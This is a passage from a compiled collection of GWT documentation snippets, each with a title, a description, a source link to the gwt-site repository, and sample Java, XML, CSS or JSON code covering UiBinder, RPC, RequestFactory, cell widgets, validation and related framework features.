timer.schedule(100);\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring UiBinder for Internationalization\nDESCRIPTION: This snippet shows how to configure UiBinder for internationalization by adding attributes to the root element and wrapping text in a ui:msg tag.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_0\n\nLANGUAGE: XML\nCODE:\n```\n<ui:UiBinder xmlns:ui='urn:ui:com.google.gwt.uibinder'\n    ui:generateFormat='com.google.gwt.i18n.server.PropertyCatalogFactory'\n    ui:generateKeys=\"com.google.gwt.i18n.server.keygen.MD5KeyGenerator\"\n    ui:generateLocales=\"default\">\n  <div><ui:msg description=\"Greeting\">Hello, world.</ui:msg></div>\n</ui:UiBinder>\n```\n\n----------------------------------------\n\nTITLE: Implementing Client-Side Stock Price Refresh in Java\nDESCRIPTION: This snippet shows the current client-side implementation of the refreshWatchList method, which generates random stock prices. This functionality will be moved to the server-side using GWT RPC.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/RPC.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\n  /**\n   * Generate random stock prices.\n   */\n  private void refreshWatchList() {\n    final double MAX_PRICE = 100.0; // $100.00\n    final double MAX_PRICE_CHANGE = 0.02; // +/- 2%\n\n    StockPrice[] prices = new StockPrice[stocks.size()];\n    for (int i = 0; i < stocks.size(); i++) {\n      double price = Random.nextDouble() * MAX_PRICE;\n      double change = price * MAX_PRICE_CHANGE\n          * (Random.nextDouble() * 2.0 - 1.0);\n\n      prices[i] = new StockPrice(stocks.get(i), price, change);\n    }\n\n    updateTable(prices);\n  }\n```\n\n----------------------------------------\n\nTITLE: Configuring ClientBundle in GWT Module XML\nDESCRIPTION: XML configuration required to enable ClientBundle functionality in a GWT application by adding an inherits tag to the gwt.xml file.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<inherits name=\"com.google.gwt.resources.Resources\" />\n```\n\n----------------------------------------\n\nTITLE: JSON Structure Example for Product Data\nDESCRIPTION: Example showing how to structure product data in JSON format, including nested objects and arrays for price tiers.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsJSON.md#2025-04-09_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"product\": {\n    \"name\": \"Widget\",\n    \"company\": \"ACME, Inc\",\n    \"partNumber\": \"7402-129\",\n    \"prices\": [\n      { \"minQty\": 1, \"price\": 12.49 },\n      { \"minQty\": 10, \"price\": 9.99 },\n      { \"minQty\": 50, \"price\": 7.99 }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Parsing XML in GWT\nDESCRIPTION: Demonstrates how to parse an XML document, extract specific elements and attributes, and handle potential parsing errors using GWT's XML parsing capabilities.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsXML.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nprivate void parseMessage(String messageXml) {\n  try {\n    // parse the XML document into a DOM\n    Document messageDom = XMLParser.parse(messageXml);\n\n    // find the sender's display name in an attribute of the <from> tag\n    Node fromNode = messageDom.getElementsByTagName(\"from\").item(0);\n    String from = ((Element)fromNode).getAttribute(\"displayName\");\n    fromLabel.setText(from);\n\n    // get the subject using Node's getNodeValue() function\n    String subject = messageDom.getElementsByTagName(\"subject\").item(0).getFirstChild().getNodeValue();\n    subjectLabel.setText(subject);\n\n    // get the message body by explicitly casting to a Text node\n    Text bodyNode = (Text)messageDom.getElementsByTagName(\"body\").item(0).getFirstChild();\n    String body = bodyNode.getData();\n    bodyLabel.setText(body);\n\n  } catch (DOMException e) {\n    Window.alert(\"Could not parse XML document.\");\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generated Properties for Messages with Protected Parts\nDESCRIPTION: This snippet shows the generated properties file entry for a message containing protected parts, using placeholders for the untranslatable portions.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinderI18n.md#2025-04-09_snippet_4\n\nLANGUAGE: Properties\nCODE:\n```\n# Description: blurb\n# 0=arg0 (Example: <span class='brand'>), 1=arg1 (Example: </span>), 2=arg2 (Example: <span class='tm'>TM</span>)\n6E8B421C6A7C1FEAE23FAA9D43C90D5E={0}Colgate{1}, with MFP\\!{2}\n```\n\n----------------------------------------\n\nTITLE: Code Splitting Implementation in GWT\nDESCRIPTION: Example of implementing code splitting using GWT.runAsync() to lazy load the contacts view and presenter.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture-2.md#2025-04-09_snippet_24\n\nLANGUAGE: java\nCODE:\n```\npublic void onValueChange(ValueChangeEvent<String> event) {\n    String token = event.getValue();\n\n    if (token != null) {\n      if (token.equals(\"list\")) {\n        GWT.runAsync(new RunAsyncCallback() {\n          ...\n          public void onSuccess() {\n            if (contactsView == null) {\n              contactsView = new ContactsViewImpl<ContactDetails>();\n            }\n            new ContactsPresenter(rpcService, eventBus, contactsView).go(container);\n          }\n        });\n      }\n      ...\n   }\n```\n\n----------------------------------------\n\nTITLE: Formatting Lists in Plural Forms (Java)\nDESCRIPTION: Example of formatting lists in plural forms using the locale-appropriate separators. It demonstrates how to handle different cases for order numbers ready for pickup.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideI18nPluralForms.md#2025-04-09_snippet_6\n\nLANGUAGE: java\nCODE:\n```\npublic interface MyMessages extends Messages {\n  @DefaultMessage(\"Orders {0,list,number} are ready for pickup.\")\n  @AlternateMessage({\n      \"=0\", \"No orders are ready for pickup.\",\n      \"one\", \"Order {0,list,number} is ready for pickup.\"\n  })\n  String ordersReady(@PluralCount List<Integer> orders);\n}\n```\n\n----------------------------------------\n\nTITLE: Creating and Persisting Entities with RequestFactory in Java GWT\nDESCRIPTION: This snippet demonstrates how to create a new entity on the client using RequestFactory. It creates an EmployeeProxy object, sets properties, and prepares it for persistence to the server using a RequestContext.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_16\n\nLANGUAGE: java\nCODE:\n```\nEmployeeRequest request = requestFactory.employeeRequest();\nEmployeeProxy newEmployee = request.create(EmployeeProxy.class);\nnewEmployee.setDisplayName(...);\nnewEmployee.setDepartment(...);\n...\nRequest<Void> createReq = request.persist().using(newEmployee);\n```\n\n----------------------------------------\n\nTITLE: CSS Class Name and Constant Resolution\nDESCRIPTION: Example showing how to handle naming conflicts between CSS class names and constants using @ClassName annotation.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_11\n\nLANGUAGE: css\nCODE:\n```\n@def myIdent 10px;\n.myIdent {\n  ...\n}\n```\n\nLANGUAGE: java\nCODE:\n```\ninterface MyResources extends CssResource {\n  String myIdent();\n\n  @ClassName(\"myIdent\")\n  String myIdentClass();\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Async Stock Service Interface\nDESCRIPTION: Implementation of the asynchronous interface for the Stock RPC service.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_20\n\nLANGUAGE: java\nCODE:\n```\npackage com.google.gwt.sample.stockwatcher.client;\n\nimport com.google.gwt.user.client.rpc.AsyncCallback;\n\npublic interface StockServiceAsync {\n  public void addStock(String symbol, AsyncCallback<Void> async);\n  public void removeStock(String symbol, AsyncCallback<Void> async);\n  public void getStocks(AsyncCallback<String[]> async);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Web Audio API with Elemental in GWT\nDESCRIPTION: This code snippet demonstrates how to use Elemental to create a simple audio application using the Web Audio API. It shows how to obtain JS API instances, create an audio context, set up an oscillator, and play a sound.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/elemental.md#2025-04-09_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\npackage com.myapp;\nimport elemental.client.*;\nimport elemental.dom.*;\nimport elemental.html.*;\n\npublic class ElementalExample implements EntryPoint {\n  public void onModuleLoad() {\n    Window window = Browser.getWindow();\n    AudioContext audioContext = window.newAudioContext();\n    Oscillator osc = audioContext.createOscillator();\n    osc.setType(Oscillator.SQUARE);\n    osc.connect((AudioParam) audioContext.getDestination(), 0);\n    osc.getFrequency().setValue(440.0f);\n    osc.noteOn(0);\n  }  \n}\n```\n\n----------------------------------------\n\nTITLE: Implementing KeyProvider in GWT Cell Widgets\nDESCRIPTION: Example shows how to implement a KeyProvider for Contact objects in a CellList. The code demonstrates maintaining selection state even when object properties change by using unique IDs as keys.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellWidgets.md#2025-04-09_snippet_5\n\nLANGUAGE: java\nCODE:\n```\n/**\n  * Example of using a {@link ProvidesKey}.\n  */\npublic class KeyProviderExample implements EntryPoint {\n\n  // A simple data type that represents a contact.\n  private static class Contact {\n    private static int nextId = 0;\n\n    private final int id;\n    private String name;\n\n    public Contact(String name) {\n      nextId++;\n      this.id = nextId;\n      this.name = name;\n    }\n  }\n\n  // A custom Cell used to render a Contact.\n  private static class ContactCell extends AbstractCell<Contact> {\n    @Override\n    public void render(Contact value, Object key, SafeHtmlBuilder sb) {\n      if (value != null) {\n        sb.appendEscaped(value.name);\n      }\n    }\n  }\n\n  // The list of data to display.\n  private static final List<Contact> CONTACTS = Arrays.asList(new Contact(\n      \"John\"), new Contact(\"Joe\"), new Contact(\"Michael\"),\n      new Contact(\"Sarah\"), new Contact(\"George\"));\n\n  public void onModuleLoad() {\n    // Define a key provider for a Contact. We use the unique ID as the key,\n    // which allows to maintain selection even if the name changes.\n    ProvidesKey<Contact> keyProvider = new ProvidesKey<Contact>() {\n      public Object getKey(Contact item) {\n        // Always do a null check.\n        return (item == null) ? null : item.id;\n      }\n    };\n\n    // Create a CellList using the keyProvider.\n    CellList<Contact> cellList = new CellList<Contact>(new ContactCell(),\n        keyProvider);\n\n    // Push data into the CellList.\n    cellList.setRowCount(CONTACTS.size(), true);\n    cellList.setRowData(0, CONTACTS);\n\n    // Add a selection model using the same keyProvider.\n    SelectionModel<Contact> selectionModel = new SingleSelectionModel<Contact>(\n        keyProvider);\n    cellList.setSelectionModel(selectionModel);\n\n    // Select a contact. The selectionModel will select based on the ID because\n    // we used a keyProvider.\n    Contact sarah = CONTACTS.get(3);\n    selectionModel.setSelected(sarah, true);\n\n    // Modify the name of the contact.\n    sarah.name = \"Sara\";\n\n    // Redraw the CellList. Sarah/Sara will still be selected because we\n    // identify her by ID. If we did not use a keyProvider, Sara would not be\n    // selected.\n    cellList.redraw();\n\n    // Add the widgets to the root panel.\n    RootPanel.get().add(cellList);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Validating Bean Constraints in Java\nDESCRIPTION: Example code showing how to obtain a validator instance and use it to validate a Person object, returning a set of constraint violations.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideValidation.md#2025-04-09_snippet_4\n\nLANGUAGE: java\nCODE:\n```\nValidator validator = Validation.buildDefaultValidatorFactory().getValidator();\nSet<ConstraintViolation<Person>> violations = validator.validate(person);\n```\n\n----------------------------------------\n\nTITLE: Updating Stock Price Change Dynamically in Java\nDESCRIPTION: This Java code shows how to update the stock price change dynamically, including setting the text and applying the appropriate style based on the change value.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/style.md#2025-04-09_snippet_12\n\nLANGUAGE: java\nCODE:\n```\n// Populate the Price and Change fields with new data.\nstocksFlexTable.setText(row, 1, priceText);\nLabel changeWidget = (Label)stocksFlexTable.getWidget(row, 2);\nchangeWidget.setText(changeText + \" (\" + changePercentText + \"%)\");\n\n// Change the color of text in the Change field based on its value.\nString changeStyleName = \"noChange\";\nif (price.getChangePercent() < -0.1f) {\n  changeStyleName = \"negativeChange\";\n}\nelse if (price.getChangePercent() > 0.1f) {\n  changeStyleName = \"positiveChange\";\n}\n\nchangeWidget.setStyleName(changeStyleName);\n```\n\n----------------------------------------\n\nTITLE: Basic CSS Minification Example in GWT\nDESCRIPTION: Demonstrates how GWT's CssResource performs basic CSS minification by removing comments, unnecessary whitespace, and empty rules to reduce the output size while maintaining the same functionality.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_25\n\nLANGUAGE: css\nCODE:\n```\n.div {\n  /* This is the default background color */\n  background: blue;\n}\n.empty {}\n```\n\n----------------------------------------\n\nTITLE: GWT Service Implementation with Hibernate and DTO Support\nDESCRIPTION: Server-side implementation of the music store service handling conversion between DTOs and Hibernate entities.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_17\n\nLANGUAGE: java\nCODE:\n```\npublic class MusicStoreServiceImpl extends RemoteServiceServlet implements\nMusicStoreService {\n\n  @Override\n  public List<AccountDTO> getAccounts() {\n    Session session = HibernateUtil.getSessionFactory().getCurrentSession();\n    session.beginTransaction();\n    List<Account> accounts = new ArrayList<Account>(session.createQuery(\"from Account\").list());\n    List<AccountDTO> accountDTOs = new ArrayList<AccountDTO>(\n    accounts != null ? accounts.size() : 0);\n    if (accounts != null) {\n      for (Account account : accounts) {\n        accountDTOs.add(createAccountDTO(account));\n      }\n    }\n    session.getTransaction().commit();\n    return accountDTOs;\n  }\n\n  @Override\n  public List<RecordDTO> getRecords() {\n    Session session = HibernateUtil.getSessionFactory().getCurrentSession();\n    session.beginTransaction();\n    List<Record> records = new ArrayList<Record>(session.createQuery(\"from Record\").list());\n    List<RecordDTO> recordDTOs = new ArrayList<RecordDTO>(records != null ? records.size() : 0);\n    if (records != null) {\n      for (Record record : records) {\n        recordDTOs.add(createRecordDTO(record));\n      }\n    }\n    session.getTransaction().commit();\n    return recordDTOs;\n  }\n\n  @Override\n  public Long saveAccount(AccountDTO accountDTO) {\n    Account account = new Account(accountDTO);\n    Session session = HibernateUtil.getSessionFactory().getCurrentSession();\n    session.beginTransaction();\n    session.save(account);\n    session.getTransaction().commit();\n    return account.getId();\n  }\n\n  @Override\n  public Long saveRecord(RecordDTO recordDTO) {\n    Record record = new Record(recordDTO);\n    Session session = HibernateUtil.getSessionFactory().getCurrentSession();\n    session.beginTransaction();\n    session.save(record);\n    session.getTransaction().commit();\n    return record.getId();\n  }\n\n  @Override\n  public void saveRecordToAccount(AccountDTO accountDTO, RecordDTO recordDTO) {\n    Session session = HibernateUtil.getSessionFactory().getCurrentSession();\n    session.beginTransaction();\n    Account account = (Account) session.load(Account.class, accountDTO.getId());\n    Record record = (Record) session.load(Record.class, recordDTO.getId());\n    account.addRecord(record);\n    session.save(account);\n    session.getTransaction().commit();\n  }\n\n  @Override\n  public List<AccountDTO> getAllAccountRecords() {\n    Session session = HibernateUtil.getSessionFactory().getCurrentSession();\n    session.beginTransaction();\n    List<Account> accounts = new ArrayList<Account>(session.createQuery(\"from Account\").list());\n    List<AccountDTO> accountDTOs = new ArrayList<AccountDTO>(accounts != null ? accounts.size() : 0);\n    if (accounts != null) {\n      for (Account account : accounts) {\n        accountDTOs.add(createAccountDTO(account));\n      }\n    }\n    session.getTransaction().commit();\n    return accountDTOs;\n  }\n\n  private AccountDTO createAccountDTO(Account account) {\n    Set<Record> records = account.getRecords();\n    Set<RecordDTO> recordDTOs = new HashSet<RecordDTO>(records != null ? records.size() : 0);\n    if (records != null) {\n      for (Record record : records) {\n        recordDTOs.add(createRecordDTO(record));\n      }\n    }\n    return new AccountDTO(account.getId(), account.getName(), account.getPassword(), recordDTOs);\n  }\n\n  private RecordDTO createRecordDTO(Record record) {\n    return new RecordDTO(record.getId(), record.getTitle(), record.getYear(), record.getPrice());\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Serializing JSON Structure with AutoBean in GWT\nDESCRIPTION: Demonstrates the JSON serialization of a Person object with nested Address using AutoBean. Shows how AutoBeanCodex mirrors the interface declaration in the serialized form.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideAutoBeans.md#2025-04-09_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{ \"name\" : \"John Doe\", \"address\" : { \"street\" : \"1234 Maple St\", \"city\" : \"Nowhere\" } }\n```\n\n----------------------------------------\n\nTITLE: Login Validation in GWT Application\nDESCRIPTION: Method to check if user is logged in, throwing NotLoggedInException if user is not authenticated.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/appengine.md#2025-04-09_snippet_29\n\nLANGUAGE: java\nCODE:\n```\nprivate void checkLoggedIn() throws NotLoggedInException {\n    if (getUser() == null) {\n      throw new NotLoggedInException(\"Not logged in.\");\n    }\n  }\n```\n\n----------------------------------------\n\nTITLE: CSS Selector Merging Constraints Example in GWT\nDESCRIPTION: Demonstrates the constraints of GWT's selector merging optimization. Rules cannot be merged if doing so would change the cascade order of properties that appear in multiple rules.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideClientBundle.md#2025-04-09_snippet_29\n\nLANGUAGE: css\nCODE:\n```\n.a {background: green;}\n.b {border: thin solid blue;}\n.a {border-top: thin solid red;}\n```\n\n----------------------------------------\n\nTITLE: Refreshing Stock Data Upon Adding New Stock in GWT\nDESCRIPTION: Updates the refreshWatchList method call in the addStock method to immediately populate price and change values when a new stock is added to the table.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/tutorial/codeclient.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\nprivate void addStock() {\n\n  ...\n\n  // Add a button to remove a stock from the table.\n  Button removeStockButton = new Button(\"x\");\n  removeStockButton.addClickHandler(new ClickHandler() {\n    public void onClick(ClickEvent event) {\n      int removedIndex = stocks.indexOf(symbol);\n      stocks.remove(removedIndex);\n      stocksFlexTable.removeRow(removedIndex + 1);\n    }\n  });\n  stocksFlexTable.setWidget(row, 3, removeStockButton);\n\n  // Get the stock price.\n  refreshWatchList();\n}\n```\n\n----------------------------------------\n\nTITLE: Using UiField with Provided=True for Constructor Arguments\nDESCRIPTION: Demonstrates how to use @UiField(provided=true) to manually instantiate widgets that require constructor arguments in a UiBinder owner class.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_17\n\nLANGUAGE: java\nCODE:\n```\npublic class UserDashboard extends Composite {\n  interface MyUiBinder extends UiBinder<Widget, UserDashboard>;\n  private static final MyUiBinder uiBinder = GWT.create(MyUiBinder.class);\n\n  @UiField(provided=true)\n  final CricketScores cricketScores; // cannot be private\n\n  public UserDashboard(CricketScores cricketScores) {\n    // DI fans take note!\n    this.cricketScores = cricketScores;\n    initWidget(uiBinder.createAndBindUi(this));\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using UiBinder-generated Widget in Java\nDESCRIPTION: Shows how to instantiate and use a UiBinder-generated widget class in Java code.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_5\n\nLANGUAGE: Java\nCODE:\n```\nHelloWidgetWorld helloWorld =\n  new HelloWidgetWorld(\"able\", \"baker\", \"charlie\");\n```\n\n----------------------------------------\n\nTITLE: Implementing Timeout Logic with Timer in Java for GWT\nDESCRIPTION: Illustrates how to use Timer for implementing timeout logic in conjunction with a Remote Procedure Call (RPC). It includes error handling, cancellation, and proper management of timer instances.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideCodingBasicsDelayed.md#2025-04-09_snippet_1\n\nLANGUAGE: java\nCODE:\n```\nimport com.google.gwt.user.client.Timer;\nimport com.google.gwt.user.client.Window;\nimport com.google.gwt.user.client.rpc.AsyncCallback;\n\npublic class Foo {\n\n  // A keeper of the timer instance in case we need to cancel it\n  private Timer timeoutTimer = null;\n\n  // An indicator when the computation should quit\n  private boolean abortFlag = false;\n\n  static final int TIMEOUT = 30; // 30 second timeout\n\n  void startWork () {\n\n    // ...\n\n    // Check to make sure the timer isn't already running.\n    if (timeoutTimer != null) {\n        Window.alert(\"Command is already running!\");\n        return;\n    }\n\n    // Create a timer to abort if the RPC takes too long\n    timeoutTimer = new Timer() {\n      public void run() {\n        Window.alert(\"Timeout expired.\");\n        timeoutTimer = null;\n        abortFlag = true;\n      }\n    };\n\n    // (re)Initialize the abort flag and start the timer.\n    abortFlag = false;\n    timeoutTimer.schedule(TIMEOUT * 1000); // timeout is in milliseconds\n\n    // Kick off an RPC\n    myService.myRpcMethod(arg, new AsyncCallback() {\n\n      public void onFailure(Throwable caught) {\n         Window.alert(\"RPC Failed:\" + caught);\n         cancelTimer();\n      }\n\n      public void onSuccess(Object result) {\n         cancelTimer();\n         if (abortFlag) {\n           // Timeout already occurred. discard result\n           return;\n         }\n         Window.alert (\"RPC returned: \"+ (String)result);\n      }\n    }\n  }\n\n  // Stop the timeout timer if it is running\n  private void cancelTimer() {\n    if (timeoutTimer != null) {\n       timeoutTimer.cancel();\n       timeoutTimer = null;\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Custom Field Serializer in Java\nDESCRIPTION: Example of creating a custom field serializer class for HashMap in GWT. The serializer must extend CustomFieldSerializer<T> and implement required serialization methods.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideServerCommunication.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\npublic final class HashMap_CustomFieldSerializer extends CustomFieldSerializer<HashMap>\n```\n\n----------------------------------------\n\nTITLE: Binding UI Event Handlers in GWT MVP Architecture\nDESCRIPTION: This snippet shows how to bind UI event handlers in a presenter's bind method. It demonstrates setting up click handlers for buttons and list selections, with the presenter responding to these events by either updating the model or firing events on an event bus.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/mvp-architecture.md#2025-04-09_snippet_3\n\nLANGUAGE: java\nCODE:\n```\npublic class ContactsPresenter implements Presenter {\n  ...\n  public void bind() {\n    display.getAddButton().addClickHandler(new ClickHandler() {\n      public void onClick(ClickEvent event) {\n        eventBus.fireEvent(new AddContactEvent());\n      }\n    });\n\n    display.getDeleteButton().addClickHandler(new ClickHandler() {\n      public void onClick(ClickEvent event) {\n        deleteSelectedContacts();\n      }\n    });\n\n    display.getList().addClickHandler(new ClickHandler() {\n      public void onClick(ClickEvent event) {\n        int selectedRow = display.getClickedRow(event);\n\n        if (selectedRow >= 0) {\n          String id = contacts.get(selectedRow).getId();\n          eventBus.fireEvent(new EditContactEvent(id));\n        }\n      }\n    });\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: GWT Remote Service Interface with DTO Support\nDESCRIPTION: Remote service interface definition using DTOs for data transfer between client and server.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/articles/using_gwt_with_hibernate.md#2025-04-09_snippet_15\n\nLANGUAGE: java\nCODE:\n```\n@RemoteServiceRelativePath(\"musicservice\")\npublic interface MusicStoreService extends RemoteService {\n  public List<AccountDTO> getAccounts();\n\n  public List<RecordDTO> getRecords();\n\n  public Long saveAccount(AccountDTO accountDTO);\n\n  public Long saveRecord(RecordDTO recordDTO);\n\n  public void saveRecordToAccount(AccountDTO accountDTO, RecordDTO recordDTO);\n\n  public List<AccountDTO> getAllAccountRecords();\n}\n```\n\n----------------------------------------\n\nTITLE: HTML Element IDs for GWT Widget Attachment\nDESCRIPTION: Example showing how to use HTML element IDs to specify locations where GWT widgets will be attached in the page.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideOrganizingProjects.md#2025-04-09_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<body>\n    <!-- ... other sample HTML omitted   -->\n    <table align=center>\n      <tr>\n        <td id=\"slot1\"></td>\n        <td id=\"slot2\"></td>\n      </tr>\n    </table>\n  </body>\n```\n\n----------------------------------------\n\nTITLE: Defining Bean Validation Constraints in Java\nDESCRIPTION: Example showing how to specify validation constraints using annotations on a Person class, ensuring the name field is not null and has a minimum length of 4 characters.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideValidation.md#2025-04-09_snippet_0\n\nLANGUAGE: java\nCODE:\n```\npublic class Person implements Serializable {\n  @NotNull\n  @Size(min = 4, message = \"Name must be at least 4 characters long.\")\n  private String name;\n}\n```\n\n----------------------------------------\n\nTITLE: Development Mode Logging Handler\nDESCRIPTION: Example of conditional handler addition for development mode using LogConfiguration check.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideLogging.md#2025-04-09_snippet_8\n\nLANGUAGE: java\nCODE:\n```\nif (LogConfiguration.loggingIsEnabled()) {\n  logger.addHandler(new HasWidgetsLogHandler(customLogArea));\n}\n```\n\n----------------------------------------\n\nTITLE: Applying Different XML Templates to the Same Widget in GWT\nDESCRIPTION: This snippet demonstrates how to use multiple XML templates for the same view in GWT. It defines a FooPickerDisplay class that implements a Display interface and uses different UiBinder interfaces for red and blue templates.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiBinder.md#2025-04-09_snippet_29\n\nLANGUAGE: java\nCODE:\n```\npublic class FooPickerController {\n  public interface Display {\n    HasText getTitleField();\n    SourcesChangeEvents getPickerSelect();\n  }\n\n  public void setDisplay(FooPickerDisplay display) { ... }\n}\n\npublic class FooPickerDisplay extends Composite\n    implements FooPickerController.Display {\n\n  @UiTemplate(\"RedFooPicker.ui.xml\")\n  interface RedBinder extends UiBinder<Widget, FooPickerDisplay> {}\n  private static RedBinder redBinder = GWT.create(RedBinder.class);\n\n  @UiTemplate(\"BlueFooPicker.ui.xml\")\n  interface BlueBinder extends UiBinder<Widget, FooPickerDisplay> {}\n  private static BlueBinder blueBinder = GWT.create(BlueBinder.class);\n\n  @UiField HasText titleField;\n  @UiField SourcesChangeEvents pickerSelect;\n\n  public HasText getTitleField() {\n    return titleField;\n  }\n  public SourcesChangeEvents getPickerSelect() {\n    return pickerSelect;\n  }\n\n  protected FooPickerDisplay(UiBinder<Widget, FooPickerDisplay> binder) {\n    initWidget(binder.createAndBindUi(this));\n  }\n\n  public static FooPickerDisplay createRedPicker() {\n    return new FooPickerDisplay(redBinder);\n  }\n\n  public static FooPickerDisplay createBluePicker() {\n    return new FooPickerDisplay(blueBinder);\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Updating ARIA Live Region Content in GWT AutoComplete\nDESCRIPTION: Updates the content of an ARIA live region when autocomplete suggestions change. Generates text content describing available suggestions for screen readers.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideA11y.md#2025-04-09_snippet_7\n\nLANGUAGE: java\nCODE:\n```\n// This method is called via a keyboard event handler\n    private void showSuggestions(Collection suggestions) {\n      if (suggestions.size() > 0) {\n\n        // Popupulate the visible suggestion pop-up widget with the new selections\n        // and show them\n        ....\n        // Generate the hidden div content based on the suggestions\n        String hiddenDivText = \"Suggestions \";\n\n        for (Suggestion curSuggestion : suggestions) {\n          hiddenDivText += \" \" + curSuggestion.getDisplayString();\n        }\n\n        DOM.setInnerText(ariaElement, hiddenDivText);\n      }\n    }\n```\n\n----------------------------------------\n\nTITLE: Inheriting GWT JUnit Module\nDESCRIPTION: Example showing how to inherit the JUnit module in a GWT project's module XML file using the inherits tag.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideOrganizingProjects.md#2025-04-09_snippet_9\n\nLANGUAGE: xml\nCODE:\n```\n<inherits name=\"com.google.gwt.junit.JUnit\"/>\n```\n\n----------------------------------------\n\nTITLE: Implementing a Person Entity with Embedded Address in GWT RequestFactory\nDESCRIPTION: Server-side Person entity class with an embedded Address object. This demonstrates how entity relationships can be represented in RequestFactory's server-side model.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideRequestFactory.md#2025-04-09_snippet_2\n\nLANGUAGE: java\nCODE:\n```\n@Entity\npublic class Person {\n  @Id\n  private Long id;\n  private Integer version = 0;\n  private String firstName, lastName;\n  @Embedded\n  private Address address;\n  ...\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Database from CellList in GWT\nDESCRIPTION: This example demonstrates how to use a ValueUpdater with a CellList to handle user input and update the database. It creates a CellList with a TextInputCell and sets up a ValueUpdater to process changes.\nSOURCE: https://github.com/gwtproject/gwt-site/blob/main/src/main/markdown/doc/latest/DevGuideUiCellWidgets.md#2025-04-09_snippet_10\n\nLANGUAGE: Java\nCODE:\n```\n/**\n * Example of using a {@link ValueUpdater} with a {@link CellList}.\n */\npublic class CellListValueUpdaterExample implements EntryPoint {\n\n  /**\n   * The list of data to display.\n   */\n  private static final List<String> DAYS = Arrays.asList(\"Sunday\", \"Monday\",\n      \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\");\n\n  public void onModuleLoad() {\n    // Create a cell that will interact with a value updater.\n    TextInputCell inputCell = new TextInputCell();\n\n    // Create a CellList that uses the cell.\n    CellList<String> cellList = new CellList<String>(inputCell);\n\n    // Create a value updater that will be called when the value in a cell changes.\n    ValueUpdater<String> 